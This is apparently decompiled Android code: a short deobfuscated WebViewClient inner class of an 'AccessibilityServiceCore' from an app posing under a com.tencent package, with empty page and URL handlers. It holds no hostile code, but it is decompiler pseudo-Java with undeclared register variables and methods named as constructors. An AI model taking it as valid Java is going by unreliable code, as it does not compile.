package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_MyWebViewClient
 * Original: Lcom/tencent/tunesxconcerningn1012$MyWebViewClient;
 */
class AccessibilityServiceCore_MyWebViewClient extends WebViewClient {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

    private void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new WebViewClient()
        return;
    }

     void Constructor(AccessibilityServiceCore param0, AccessibilityServiceCore$1 param1) {
        // new AccessibilityServiceCore$MyWebViewClient(v1)
        return;
    }

    public void onPageFinished(WebView param0, String param1) {
        return;
    }

    public boolean shouldOverrideUrlLoading(WebView param0, String param1) {
        v1 = 0;
        return 0;
    }
}
